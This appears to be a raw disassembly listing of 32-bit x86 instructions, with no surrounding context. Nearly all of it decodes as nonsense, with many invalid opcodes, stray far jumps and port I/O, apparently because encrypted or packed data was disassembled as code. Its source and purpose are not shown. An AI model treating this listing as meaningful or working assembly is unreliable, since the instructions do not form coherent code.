  413ce9:	cmp    ah,BYTE PTR [edi]
  413ceb:	mov    dl,0x33
  413ced:	cmovo  eax,DWORD PTR [edi]
  413cf0:	push   es
  413cf1:	adc    BYTE PTR [esi+0x415c943d],0xba
  413cf8:	mov    dl,0x82
  413cfa:	xor    ecx,DWORD PTR [ecx+0x77]
  413cfd:	add    BYTE PTR gs:[ebp+0x32],bl
  413d01:	stc    
  413d02:	mov    ebx,0x3efdd8dc
  413d07:	or     eax,0x33c8832a
  413d0c:	orps   xmm5,XMMWORD PTR [ebp+0x1]
  413d10:	push   edi
  413d11:	enter  0x7ba8,0xb9
  413d15:	shl    DWORD PTR gs:[ecx],0x34
  413d19:	test   al,0x9
  413d1b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d1c:	cwde   
  413d1d:	adc    BYTE PTR [eax+0x46c59d3a],bl
  413d23:	or     al,0xf5
  413d25:	(bad)  
  413d26:	jmp    0x413d72
  413d28:	mov    ebp,0x1da23208
  413d2d:	(bad)  
  413d2e:	cmp    dh,BYTE PTR [si-0xa19]
  413d33:	leave  
  413d34:	xchg   edx,eax
  413d35:	mov    ds:0x23255b95,eax
  413d3a:	(bad)  
  413d3b:	cmc    
  413d3c:	les    edi,FWORD PTR [edi-0x4a001d3b]
  413d42:	into   
  413d43:	mov    ds:0xbc93b32a,al
  413d48:	pop    es
  413d49:	mov    DWORD PTR [esi+0x7b9ee03d],ecx
  413d4f:	adc    eax,0x2923789
  413d54:	and    ch,BYTE PTR [esi]
  413d56:	retf   0x1ebb
  413d59:	scas   eax,DWORD PTR es:[edi]
  413d5a:	fcmovnu st,st(3)
  413d5c:	int    0xf1
  413d5e:	jne    0x413da4
  413d60:	dec    esi
  413d61:	cmp    DWORD PTR ds:0xc1426078,esi
  413d67:	stos   DWORD PTR es:[edi],eax
  413d68:	mov    eax,0xa2b0d566
  413d6d:	loopne 0x413d72
  413d6f:	(bad)  
  413d71:	ret    
  413d72:	or     eax,0x1406d6aa
  413d77:	push   es
  413d78:	sub    al,0x96
  413d7a:	jmp    0x5ea69409
  413d7f:	daa    
  413d80:	xchg   DWORD PTR [eax-0x7f],esi
  413d83:	pop    eax
  413d84:	jns    0x413e01
  413d86:	push   esp
  413d87:	jns    0x413d0a
  413d89:	test   al,0x2c
  413d8b:	xor    eax,0x513b3768
  413d90:	add    DWORD PTR [edi],esp
  413d92:	fmul   QWORD PTR ss:[edx-0x69]
  413d96:	mov    edx,0x7b3f01ec
  413d9b:	push   ebx
  413d9c:	and    al,0x43
  413d9e:	or     eax,0xcd384d7
  413da3:	and    eax,0x39521f61
  413da8:	outs   dx,DWORD PTR ds:[esi]
  413da9:	jmp    0x385ea2d3
  413dae:	(bad)
  413db1:	push   ebx
  413db2:	inc    esp
  413db3:	mov    WORD PTR [esi],?
  413db5:	leave  
  413db6:	std    
  413db7:	mov    ecx,0x84559d10
  413dbc:	int3   
  413dbd:	push   es
  413dbe:	je     0x413e04
  413dc0:	xchg   esp,eax
  413dc1:	pop    eax
  413dc2:	dec    dl
  413dc4:	xchg   BYTE PTR [ecx],ch
  413dc6:	sbb    eax,0xdad7b9c8
  413dcb:	mov    cl,bh
  413dcd:	jl     0x413e16
  413dcf:	or     edi,eax
  413dd1:	lods   eax,DWORD PTR ds:[esi]
  413dd2:	addr16 jae 0x413e30
  413dd5:	jecxz  0x413dc0
  413dd7:	jmp    0x4d7:0x7b7df98c
  413dde:	cmp    DWORD PTR ds:0xa56ab62e,0xffffffc8
  413de5:	cld    
  413de6:	and    dl,BYTE PTR [ebp-0x51]
  413de9:	mov    ds:0x97a50dc4,al
  413dee:	dec    ebp
  413def:	xor    eax,0xeac0598
  413df4:	addr16 popa 
  413df6:	fdiv   DWORD PTR [edx-0x723134e7]
  413dfc:	cmp    eax,0xf944d58d
  413e01:	jnp    0x413dd0
  413e03:	in     al,0x30
  413e05:	in     eax,0x48
  413e07:	out    0xaf,eax
  413e09:	cwde   
  413e0a:	inc    ecx
  413e0b:	aad    0x41
  413e0d:	icebp  
  413e0e:	jp     0x413dfd
  413e10:	imul   eax,esp,0xb6998fe9
  413e16:	push   edi
  413e17:	dec    ecx
  413e18:	sbb    edi,DWORD PTR [ecx]
  413e1a:	push   ss
  413e1b:	out    0x9a,al
  413e1d:	pop    ebx
  413e1e:	jmp    0x28f5633a
  413e23:	sar    cl,1
  413e25:	ja     0x413e26
  413e27:	cmp    al,0xed
  413e29:	jmp    0x15bf:0xd4fe951e
  413e30:	ficom  DWORD PTR [edx-0x1519381e]
  413e36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413e37:	retf   0xd4d8
  413e3a:	call   0x3f896c01
  413e3f:	inc    esp
  413e40:	lock idiv DWORD PTR [ebx+edi*8+0x15]
  413e45:	ss dec edi
  413e47:	or     dh,BYTE PTR [edi]
  413e49:	pop    ebp
  413e4a:	jl     0x413e50
  413e4c:	adc    eax,0xee4ee3c0
  413e51:	jbe    0x413e51
  413e53:	and    eax,edx
  413e55:	fisttp WORD PTR [edi+0x73b4faf5]
  413e5b:	lds    ecx,FWORD PTR [eax+0x121218f]
  413e61:	aam    0x3f
  413e63:	ror    BYTE PTR [ebp+0x6b],0x20
  413e67:	sub    edi,DWORD PTR [ebp-0x7a]
  413e6a:	fld    DWORD PTR [ecx+0x59]
  413e6d:	sar    DWORD PTR [ebx+0x7f7f195e],0xf8
  413e74:	lods   eax,DWORD PTR ds:[esi]
  413e75:	inc    ebp
  413e76:	mov    ebx,0x8cbf6158
  413e7b:	mov    ah,0x1d
  413e7d:	mov    bh,0x67
  413e7f:	ret    
  413e80:	std    
  413e81:	lods   al,BYTE PTR ds:[esi]
  413e82:	jecxz  0x413ed6
  413e84:	push   ebx
  413e85:	dec    edi
  413e86:	(bad)  
  413e87:	scas   eax,DWORD PTR es:[edi]
  413e88:	es retf 0x9551
  413e8c:	mov    esp,0x9a747064
  413e91:	jo     0x413f07
  413e93:	rcl    DWORD PTR [edx+0x56],cl
  413e96:	mov    al,BYTE PTR [ebx]
  413e98:	(bad)  
  413e99:	cld    
  413e9a:	popa   
  413e9b:	aaa    
  413e9c:	xor    eax,0xfa13d76
  413ea1:	scas   eax,DWORD PTR es:[edi]
  413ea2:	sti    
  413ea3:	mov    ebx,DWORD PTR [ebp-0x18]
  413ea6:	jmp    0x41412e
  413eab:	rol    bh,cl
  413ead:	leave  
  413eae:	rcr    ecx,1
  413eb0:	rcr    edx,1
  413eb2:	(bad)  
  413eb3:	enter  0x3d11,0x8f
  413eb7:	add    DWORD PTR [ebp+0x5f],0x7f06efbe
  413ebe:	js     0x413ea5
  413ec0:	jle    0x413f3a
  413ec2:	js     0x413eaa
  413ec4:	adc    esp,ebp
  413ec6:	or     DWORD PTR ds:0xebe6d1e,0x4059d41f
  413ed0:	xchg   ebx,eax
  413ed1:	and    esp,ecx
  413ed3:	or     edx,DWORD PTR [ecx+0x35180ca]
  413ed9:	push   cs
  413eda:	dec    eax
  413edb:	out    0xa7,al
  413edd:	mov    dh,0x8
  413edf:	sahf   
  413ee0:	jno    0x413e69
  413ee2:	or     DWORD PTR [edi+0x2a],ebp
  413ee5:	cmc    
  413ee6:	imul   edi,DWORD PTR [edx],0x72
  413ee9:	les    edx,FWORD PTR [ecx-0x1d]
  413eec:	lahf   
  413eed:	sbb    ebp,DWORD PTR [eax]
  413eef:	push   es
  413ef0:	dec    esi
  413ef1:	and    eax,0x1e9cd7dc
  413ef6:	shl    DWORD PTR ds:0xd678ab2e,cl
  413efc:	mov    ebx,0x175a3dc8
  413f01:	repz data16 int 0xd6
  413f05:	scas   eax,DWORD PTR es:[edi]
  413f06:	xchg   ecx,eax
  413f07:	loop   0x413eb7
  413f09:	mov    ecx,0x15a1a8e
  413f0e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f0f:	div    BYTE PTR [ebp-0x74ceb676]
  413f15:	jmp    0x413ebc
  413f17:	sub    BYTE PTR [edx+0x7acb970d],ah
  413f1d:	push   ebx
  413f1e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413f1f:	ss mov edi,0x93a19329
  413f25:	jp     0x413f9f
  413f27:	xor    BYTE PTR [ecx],0x7
  413f2a:	faddp  st(6),st
  413f2c:	fimul  DWORD PTR [edx+0x66]
  413f2f:	leave  
  413f30:	push   ebx
  413f31:	pop    edi
  413f32:	inc    esp
  413f33:	sub    BYTE PTR [eax+0x418dee79],dl
  413f39:	clc    
  413f3a:	mov    al,ds:0x596f18d3
  413f3f:	out    0x2d,eax
  413f41:	dec    ecx
  413f42:	xor    DWORD PTR [ebp-0x9],edi
  413f45:	inc    ebp
  413f46:	call   0x4b179918
  413f4b:	mov    WORD PTR [edi-0x6a],?
  413f4e:	xchg   edx,eax
  413f4f:	jo     0x413f4b
  413f51:	hlt    
  413f52:	ret    0x109e
  413f55:	mov    bl,0x1
  413f57:	out    0xa6,al
  413f59:	test   eax,0x7edcc14e
  413f5e:	jbe    0x413fc3
  413f60:	enter  0x72b2,0x80
  413f64:	adc    edx,DWORD PTR [ecx+0x20]
  413f67:	icebp  
  413f68:	out    0x60,eax
  413f6a:	lea    esi,[eax]
  413f6c:	or     DWORD PTR [edi+0x346715a4],esi
  413f72:	mov    ?,WORD PTR [ecx+0x20]
  413f75:	xor    ebx,DWORD PTR [esi-0x34]
  413f78:	bound  edi,QWORD PTR [ebp-0x6b]
  413f7b:	mov    ah,0x5d
  413f7d:	push   es
  413f7e:	xor    edx,DWORD PTR [edi]
  413f80:	push   es
  413f81:	sti    
  413f82:	je     0x413fed
  413f84:	shr    BYTE PTR [ebp-0x524c08da],0xeb
  413f8b:	xor    BYTE PTR [edx-0x54],cl
  413f8e:	xchg   edi,eax
  413f8f:	sar    bl,1
  413f91:	je     0x413f6e
  413f93:	mov    DWORD PTR [ecx+0x4ab9d13c],edx
  413f99:	xchg   ebp,eax
  413f9a:	cdq    
  413f9b:	push   esi
  413f9c:	pop    edx
  413f9d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f9e:	ins    BYTE PTR es:[edi],dx
  413f9f:	and    BYTE PTR [ebx+0x34],ah
  413fa2:	mov    ebp,0x4e658244
  413fa7:	in     eax,0x36
  413fa9:	push   ss
  413faa:	repz cmp esi,esi
  413fad:	outs   dx,BYTE PTR ds:[esi]
  413fae:	cdq    
  413faf:	inc    edx
  413fb0:	push   ebx
  413fb1:	ret    0x7aed
  413fb4:	add    bl,BYTE PTR [edx]
  413fb6:	inc    edx
  413fb7:	sbb    esp,DWORD PTR [esi-0x5e]
  413fba:	jnp    0x414029
  413fbc:	test   al,0x89
  413fbe:	(bad)  
  413fbf:	mov    esp,0x38952e72
  413fc4:	inc    edx
  413fc5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fc6:	add    esi,esp
  413fc8:	xchg   esi,eax
  413fc9:	pop    ss
  413fca:	dec    edi
  413fcb:	stos   BYTE PTR es:[edi],al
  413fcc:	push   ebx
  413fcd:	dec    edi
  413fce:	mov    ebp,0x3a13d05b
  413fd3:	lds    ecx,FWORD PTR [ecx-0x53dee2a0]
  413fd9:	mov    dl,0x3
  413fdb:	enter  0x4078,0x3a
  413fdf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413fe0:	loopne 0x413fe4
  413fe2:	popa   
  413fe3:	scas   eax,DWORD PTR es:[edi]
  413fe4:	cmp    DWORD PTR [ebp+0x4099272b],ebp
  413fea:	shl    DWORD PTR [ebp-0x54],cl
  413fed:	cmovno esi,eax
  413ff0:	(bad)  
  413ff1:	push   ebp
  413ff2:	mov    al,0x24
  413ff4:	test   BYTE PTR [ecx+0x54],al
  413ff7:	mov    cl,0x4c
  413ff9:	sub    dl,BYTE PTR [ecx+0x5b401643]
  413fff:	arpl   WORD PTR [edx-0xd0748aa],bp
  414005:	push   ecx
  414006:	pop    es
  414007:	sub    DWORD PTR [esi-0x14],ebp
  41400a:	sar    DWORD PTR [edx],1
  41400c:	(bad)  
  41400e:	and    ch,BYTE PTR [ecx-0x28]
  414011:	cli    
  414012:	mov    al,0x7b
  414014:	push   0x6de37c0d
  414019:	pusha  
  41401a:	mov    bl,0x4c
  41401c:	cmp    eax,0x5f5d987d
  414021:	pop    esi
  414022:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414023:	aam    0x9a
  414025:	lock pop esi
  414027:	jnp    0x414041
  414029:	not    bh
  41402b:	cdq    
  41402c:	loopne 0x413ffb
  41402e:	xchg   edi,eax
  41402f:	xor    ebx,DWORD PTR [eax-0x661bce53]
  414035:	and    BYTE PTR [edi-0x2534c2da],ah
  41403b:	pop    edx
  41403c:	arpl   WORD PTR [eax-0x1b],sp
  41403f:	push   esi
  414040:	cmp    DWORD PTR [ebx+0x487d17bc],esi
  414046:	and    eax,0x1c33e45a
  41404b:	mov    ch,0xb5
  41404d:	dec    edi
  41404e:	rcl    BYTE PTR [edi+0x6fefb37],1
  414054:	mov    ds:0xe3d86836,eax
  414059:	cmp    BYTE PTR [esi-0x8a8c04c],al
  41405f:	push   ebx
  414060:	lahf   
  414061:	mov    DWORD PTR [esi-0x66],eax
  414064:	xor    eax,0x9d4eb59
  414069:	xchg   ecx,eax
  41406a:	mov    ecx,cs
  41406c:	pop    edi
  41406d:	test   al,0x28
  41406f:	dec    esp
  414070:	out    dx,eax
  414071:	mov    WORD PTR [esp+ecx*4-0x80],?
  414075:	mov    bl,0xf8
  414077:	sub    al,0x9c
  414079:	add    eax,0xbf89c8e3
  41407e:	or     BYTE PTR [esi+0x44cea590],ch
  414084:	mov    esi,esi
  414086:	and    al,0xec
  414088:	hlt    
  414089:	push   ecx
  41408a:	call   0xc54db103
  41408f:	(bad)  
  414090:	dec    eax
  414091:	add    eax,0xf62d476c
  414096:	jmp    0x414114
  414098:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414099:	xlat   BYTE PTR ds:[ebx]
  41409a:	mov    ecx,DWORD PTR [ebx+0x5ce41d6d]
  4140a0:	cmp    DWORD PTR [edx+eiz*2],0x87d8ffba
  4140a7:	sub    ebp,esp
  4140a9:	lds    ebp,FWORD PTR [ecx+0x7774157]
  4140af:	daa    
  4140b0:	push   ebx
  4140b1:	inc    esi
  4140b2:	ret    0x88be
  4140b5:	pop    es
  4140b6:	fcom   QWORD PTR [ecx-0x7b]
  4140b9:	add    eax,0x907e4a73
  4140be:	outs   dx,BYTE PTR ds:[esi]
  4140bf:	ret    
  4140c0:	inc    ebx
  4140c1:	daa    
  4140c2:	cwde   
  4140c3:	push   ds
  4140c4:	fld    TBYTE PTR [edi]
  4140c6:	jge    0x41410a
  4140c8:	mov    ebx,0x126a586b
  4140cd:	jge    0x414116
  4140cf:	sub    eax,0x95a21169
  4140d4:	and    DWORD PTR [esi-0x3a63f818],esp
  4140da:	sbb    DWORD PTR [edx+0x1b],eax
  4140dd:	jb     0x414086
  4140df:	bswap  ebp
  4140e1:	pop    ds
  4140e2:	fstp   TBYTE PTR [ebx-0x73]
  4140e5:	std    
  4140e6:	pop    ds
  4140e7:	lahf   
  4140e8:	sti    
  4140e9:	fdivr  QWORD PTR [eax-0x7f4fab51]
  4140ef:	js     0x4140f6
  4140f1:	ficomp WORD PTR [esi+0xe560220]
  4140f7:	jmp    0xf18f:0x1d5ae2a5
  4140fe:	xor    BYTE PTR [esi-0x1be76923],bh
  414104:	adc    eax,0x4da84ca4
  414109:	out    0x1b,eax
  41410b:	ror    BYTE PTR [esi],cl
  41410d:	fs div esi
  414110:	test   al,0xe5
  414112:	sub    al,BYTE PTR [ecx+ebp*4]
  414115:	iret   
  414116:	enter  0xa40e,0xf1
  41411a:	fistp  DWORD PTR [esi]
  41411c:	cli    
  41411d:	scas   eax,DWORD PTR es:[edi]
  41411e:	js     0x414150
  414120:	mov    dh,bl
  414122:	jbe    0x41419d
  414124:	sbb    BYTE PTR [eax+0x7b],al
  414127:	into   
  414128:	sbb    ah,BYTE PTR [edi]
  41412a:	pop    esi
  41412b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41412c:	test   eax,0xe9d833f6
  414131:	add    DWORD PTR [edx],0x0
  414134:	add    ah,al
  414136:	aas    
  414137:	int    0xc9
  414139:	(bad)  
  41413b:	aam    0x3d
  41413d:	mov    eax,ds:0xc9145a14
  414142:	pop    ebp
  414143:	daa    
  414144:	jecxz  0x41419a
  414146:	add    al,0x7f
  414148:	js     0x41412f
  41414a:	jle    0x4141c4
  41414c:	js     0x4141c3
  41414e:	shl    BYTE PTR [eax],cl
  414150:	mov    edi,0x26da623f
  414156:	fisubr DWORD PTR [eax-0x42d631b]
  41415c:	push   ds
  41415d:	or     BYTE PTR [ebp-0x56996a55],al
  414163:	imul   DWORD PTR [ecx]
  414165:	test   eax,0x8c3b0844
  41416a:	leave  
  41416b:	or     eax,0xc4330817
  414170:	das    
  414171:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414172:	ja     0x4140fb
  414174:	mov    ah,0xe2
  414176:	retf   0xe5bc
  414179:	retf   
  41417a:	jno    0x414164
  41417c:	or     BYTE PTR [eax],ch
  41417e:	dec    edx
  41417f:	test   al,0x6d
  414181:	fidiv  WORD PTR [ecx+0x68]
  414184:	mov    cl,BYTE PTR [esp+ebx*1-0x72d6a06c]
  41418b:	push   esi
  41418c:	adc    BYTE PTR [edx],bh
  41418e:	add    al,0x1c
  414190:	clc    
  414191:	inc    esp
  414192:	xchg   ecx,eax
  414193:	adc    BYTE PTR [ecx],0x7d
  414196:	xchg   edx,eax
  414197:	data16 int 0xf8
  41419a:	jp     0x41415d
  41419c:	adc    BYTE PTR [eax-0x13],dl
  41419f:	scas   al,BYTE PTR es:[edi]
  4141a0:	xchg   DWORD PTR [esi+0x6370ccf7],eax
  4141a6:	scas   al,BYTE PTR es:[edi]
  4141a7:	mov    al,ds:0x38d0ab6
  4141ac:	das    
  4141ad:	mov    cl,BYTE PTR [esi+0x1d]
  4141b0:	add    al,0x4d
  4141b2:	mov    edx,0xfa8ba6b7
  4141b7:	ds call 0xe7ebe49
  4141bd:	mov    ah,0x5a
  4141bf:	int    0xad
  4141c1:	jae    0x414172
  4141c3:	pusha  
  4141c4:	pop    ds
  4141c5:	mov    ebp,edi
  4141c7:	repnz ss int3 
  4141ca:	xor    DWORD PTR [edi+0x6b475f1d],esp
  4141d0:	in     eax,dx
  4141d1:	xchg   DWORD PTR [edx+0x4],ebx
  4141d4:	out    dx,ax
  4141d6:	(bad)  
  4141d7:	dec    edx
  4141d8:	sahf   
  4141d9:	(bad)  
  4141da:	lock and edi,DWORD PTR [edi+0x5f8f0b21]
  4141e1:	mov    eax,0xcc83dbd5
  4141e6:	ins    DWORD PTR es:[edi],dx
  4141e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4141e8:	test   eax,0x683ddb6a
  4141ed:	out    0x99,eax
  4141ef:	cmp    ah,BYTE PTR [edi]
  4141f1:	sub    BYTE PTR [edx+0x0],0x79
  4141f5:	fcmovnu st,st(5)
  4141f7:	std    
  4141f8:	mov    ds:0xf69d3971,eax
  4141fd:	sbb    BYTE PTR gs:0x7a1eef67,cl
  414204:	scas   eax,DWORD PTR es:[edi]
  414205:	loope  0x41418e
  414207:	jbe    0x414285
  414209:	pop    ecx
  41420a:	adc    eax,0x21e443b2
  41420f:	rol    edi,1
  414211:	fcmovu st,st(1)
  414213:	test   eax,0xbc6dd776
  414218:	mov    cl,0x5b
  41421a:	test   BYTE PTR [ecx+ebp*2+0x64],0xb6
  41421f:	mov    ds:0xc07140b2,eax
  414224:	jns    0x4141aa
  414226:	ud0    ebp,esi
  414229:	push   0xfffffff6
  41422b:	mov    bl,0x24
  41422d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41422e:	inc    ecx
  41422f:	mov    esp,0x90e44eb7
  414234:	jmp    DWORD PTR [edi+esi*1]
  414237:	sahf   
  414238:	xor    DWORD PTR [ecx+0x66],edx
  41423b:	push   cs
  41423c:	popf   
  41423d:	mov    dl,0x1e
  41423f:	out    0xce,eax
  414241:	cmp    eax,DWORD PTR [eax+edx*8-0x7b]
  414245:	xchg   ecx,eax
  414246:	xchg   edx,eax
  414247:	cli    
  414248:	ins    BYTE PTR es:[edi],dx
  414249:	mov    eax,0xf4f92c71
  41424e:	or     DWORD PTR [edx],0xffffffcd
  414251:	icebp  
  414252:	sar    DWORD PTR [edx-0x520a2b19],cl
  414258:	es ret 0x94
  41425c:	test   DWORD PTR [ebp+0x31],ecx
  41425f:	ins    DWORD PTR es:[edi],dx
  414260:	nop
  414261:	push   cs
  414262:	out    dx,al
  414263:	xor    al,0x1e
  414265:	shl    DWORD PTR [edx],cl
  414267:	xchg   ebp,eax
  414268:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414269:	mov    ch,0xfa
  41426b:	fld    QWORD PTR [ebp-0x48]
  41426e:	jmp    0x41421c
  414270:	jp     0x414260
  414272:	dec    edx
  414273:	jae    0x414262
  414275:	iret   
  414276:	or     edi,DWORD PTR [ecx+eiz*4-0xe]
  41427a:	inc    edi
  41427b:	dec    esi
  41427c:	cld    
  41427d:	xchg   BYTE PTR [ebp+0x3685653b],bh
  414283:	dec    edi
  414284:	cs and eax,0x9370a0f7
  41428a:	mov    bl,0xd7
  41428c:	imul   esp,DWORD PTR [ebp+0x8],0xffffffc4
  414290:	or     al,0x23
  414292:	mov    dh,0x19
  414294:	sbb    dl,dl
  414296:	mov    ds:0x4561310,eax
  41429b:	xchg   edi,eax
  41429c:	push   ebp
  41429d:	scas   eax,DWORD PTR es:[edi]
  41429e:	nop
  41429f:	mov    dl,BYTE PTR [ecx+esi*2+0x76cfbc6]
  4142a6:	test   al,0x1a
  4142a8:	mov    esi,0x55dab3e6
  4142ad:	jp     0x414261
  4142af:	jbe    0x4142f4
  4142b1:	pop    eax
  4142b2:	and    al,0x2a
  4142b4:	dec    ecx
  4142b5:	sbb    al,0x66
  4142b7:	pushf  
  4142b8:	ret    
  4142b9:	add    dl,al
  4142bb:	mov    ecx,0x94d5a557
  4142c0:	imul   ebx,DWORD PTR [eax],0xffffff8e
  4142c3:	fdiv   QWORD PTR [edi-0x77]
  4142c6:	jmp    0x414266
  4142c8:	nop
  4142c9:	xchg   ebx,eax
  4142ca:	repz fisub WORD PTR [edx]
  4142cd:	outs   dx,DWORD PTR es:[esi]
  4142cf:	fwait
  4142d0:	xchg   edi,eax
  4142d1:	xor    dh,BYTE PTR [ebx]
  4142d3:	sub    DWORD PTR [esi+0x1914a0e5],ecx
  4142d9:	inc    esi
  4142da:	rcl    DWORD PTR [eax+ebx*2-0x7f],0x9a
  4142df:	cmc    
  4142e0:	cld    
  4142e1:	lods   eax,DWORD PTR ds:[esi]
  4142e2:	loop   0x414274
  4142e4:	cmp    eax,0xf830b496
  4142e9:	xchg   dl,bl
  4142eb:	xchg   DWORD PTR [ebp+edi*1+0x32],ecx
  4142ef:	int3   
  4142f0:	aad    0xae
  4142f2:	cmp    BYTE PTR [edi-0x46],bh
  4142f5:	aam    0xe9
  4142f7:	pop    ecx
  4142f8:	out    dx,al
  4142f9:	fsub   st,st(3)
  4142fb:	test   eax,0xaa6a8015
  414300:	mov    ah,0x40
  414302:	(bad)  
  414303:	rol    eax,cl
  414305:	jo     0x4142ed
  414307:	pop    esp
  414308:	clc    
  414309:	rep outs dx,DWORD PTR ds:[esi]
  41430b:	or     cl,BYTE PTR [ecx]
  41430d:	mov    ebp,0x3dd24ab
  414312:	xchg   DWORD PTR [edi],ecx
  414314:	not    esp
  414316:	mov    BYTE PTR [ecx+0x45],dl
  414319:	xchg   edi,eax
  41431a:	cs adc eax,0x6fb73503
  414320:	push   ss
  414321:	jns    0x41433f
  414323:	mov    bl,BYTE PTR [ecx+0x9d5c70b]
  414329:	jg     0x414301
  41432b:	and    dl,0xc6
  41432e:	cmp    eax,0xc7afba84
  414333:	(bad)  [esi+eax*1]
  414336:	fadd   DWORD PTR [ebp-0x163ee7b]
  41433c:	cmp    eax,0x2540b2af
  414341:	xchg   ebx,eax
  414342:	stos   BYTE PTR es:[edi],al
  414343:	mov    edx,0xc4c3b2ef
  414348:	jnp    0x4142e5
  41434a:	sub    DWORD PTR [ebx],ebx
  41434c:	retf   
  41434d:	pushf  
  41434e:	or     ch,BYTE PTR [edx+edi*8-0x5f]
  414352:	js     0x4143b5
  414354:	out    0xc1,al
  414356:	int    0x50
  414358:	in     eax,dx
  414359:	or     esp,0xffffff9f
  41435c:	add    esp,DWORD PTR [eax+0x26e0fd87]
  414362:	mov    dh,ah
  414364:	cdq    
  414365:	(bad)  
  414366:	inc    eax
  414367:	nop
  414368:	jae    0x41432a
  41436a:	mul    BYTE PTR ds:0x8c6bd5e1
  414370:	imul   ecx,DWORD PTR [edi],0x41d00f7b
  414376:	or     ah,ch
  414378:	jo     0x414329
  41437a:	out    0xd5,al
  41437c:	push   ebx
  41437d:	lock jmp 0x414346
  414380:	push   esi
  414381:	jae    0x414307
  414383:	mov    ds:0xbba13fbc,eax
  414388:	test   al,0xac
  41438a:	arpl   sp,sp
  41438c:	outs   dx,DWORD PTR ds:[esi]
  41438d:	pop    edi
  41438e:	mov    ebx,0x17f274e3
  414393:	jbe    0x414319
  414395:	ror    DWORD PTR [esi+0x24],0x3a
  414399:	mov    al,0x3d
  41439b:	das    
  41439c:	push   ebx
  41439d:	stc    
  41439e:	shr    DWORD PTR [edx+0x31],1
  4143a1:	mov    al,ds:0x916f2aa9
  4143a6:	gs xchg esp,eax
  4143a8:	sahf   
  4143a9:	mov    bl,cl
  4143ab:	mov    dl,0x1c
  4143ad:	clc    
  4143ae:	call   0xc807:0xa672b5af
  4143b5:	and    edx,DWORD PTR [eax]
  4143b7:	or     al,0x2b
  4143b9:	ror    DWORD PTR [ebp+0x72981fbc],1
  4143bf:	xor    al,BYTE PTR [eax]
  4143c1:	cmp    edi,edx
  4143c3:	jbe    0x4129d7
  4143c9:	mov    edx,DWORD PTR [ebp-0xc]
  4143cc:	mov    edi,DWORD PTR [ebp-0x24]
  4143cf:	xor    edx,eax
  4143d1:	add    edx,ecx
  4143d3:	jmp    0x41465b
  4143d8:	(bad)
  4143db:	rcr    bl,1
  4143dd:	fcmovb st,st(5)
  4143df:	rol    DWORD PTR [ebx-0x7f],1
  4143e2:	add    ecx,ebp
  4143e4:	cmp    ch,BYTE PTR [ecx+0x9c1647b]
  4143ea:	jg     0x414464
  4143ec:	in     eax,0x7e
  4143ee:	js     0x414468
  4143f0:	sub    edx,DWORD PTR [edx-0x2367190b]
  4143f6:	push   ss
  4143f7:	add    DWORD PTR [edi-0xe],ebx
  4143fa:	out    dx,eax
  4143fb:	mov    BYTE PTR [eax-0x5777ba51],cl
  414401:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414402:	and    esi,DWORD PTR [eax-0x24]
  414405:	and    al,0xbc
  414407:	lock inc ebx
  414409:	sbb    eax,0x36982087
  41440e:	hlt    
  41440f:	sub    DWORD PTR [ecx+0x72],ecx
  414412:	adc    ecx,DWORD PTR [ecx+0x69]
  414415:	fadd   DWORD PTR [esi-0x2d]
  414418:	push   0x6b
  41441a:	enter  0x85d8,0x8b
  41441e:	pop    esi
  41441f:	sbb    eax,0xcd183df
  414424:	push   0xffffff8c
  414426:	mov    esi,0xacf3cd3f
  41442b:	loopne 0x414485
  41442d:	xchg   esp,eax
  41442e:	cmp    DWORD PTR [ecx-0x62254054],ecx
  414434:	xor    eax,0x7ab825e8
  414439:	js     0x414478
  41443b:	dec    ebx
  41443c:	cmp    DWORD PTR [edi+0x6e73c5f0],edx
  414442:	xor    eax,0x3c0854be
  414447:	jne    0x4144b9
  414449:	mul    DWORD PTR [edi+0x1c]
  41444c:	xor    cl,BYTE PTR [edx]
  41444e:	inc    ecx
  41444f:	stos   DWORD PTR es:[edi],eax
  414450:	push   edi
  414451:	cdq    
  414452:	int3   
  414453:	fsubrp st(5),st
  414455:	push   edx
  414456:	ins    DWORD PTR es:[edi],dx
  414457:	jp     0x414442
  414459:	mov    es,edi
  41445b:	inc    ebx
  41445c:	dec    ebp
  41445d:	fisub  WORD PTR [esi+0x2a47b525]
  414463:	jmp    0x9d72:0x54f05541
  41446a:	out    dx,al
  41446b:	pop    ss
  41446c:	dec    ebx
  41446d:	cmp    eax,esi
  41446f:	push   edi
  414470:	dec    ebx
  414471:	pop    edi
  414472:	mov    WORD PTR [ebp-0x7784f89],cs
  414478:	jmp    0x414446
  41447a:	push   edi
  41447b:	mov    edi,0xa7bc8e63
  414480:	out    dx,al
  414481:	(bad)  
  414482:	ss popf 
  414484:	enter  0x135,0x30
  414488:	or     ah,BYTE PTR [ebp-0x941ab0f]
  41448e:	mov    esi,DWORD PTR [esp+esi*2-0x6ae69b7]
  414495:	stos   BYTE PTR es:[edi],al
  414496:	xor    al,0xff
  414498:	inc    ecx
  414499:	iret   
  41449a:	fnstsw WORD PTR ds:0xf393e01c
  4144a0:	push   ss
  4144a1:	xchg   BYTE PTR [esi-0x27be995e],dl
  4144a7:	xor    al,0xbe
  4144a9:	out    0x10,eax
  4144ab:	jmp    0x51c7d809
  4144b0:	lea    esi,[esi+0x235ad106]
  4144b6:	jle    0x4144b4
  4144b8:	data16 das 
  4144ba:	inc    ecx
  4144bb:	(bad)  
  4144bc:	lds    esp,FWORD PTR [esi+0x44]
  4144bf:	push   ds
  4144c0:	adc    dh,al
  4144c2:	test   DWORD PTR [ebp+0x1f],edi
  4144c5:	adc    eax,0x1b34bf1d
  4144ca:	xor    BYTE PTR [ebp-0x1a],ch
  4144cd:	test   eax,0xf4be835d
  4144d2:	adc    ch,dh
  4144d4:	hlt    
  4144d5:	push   cs
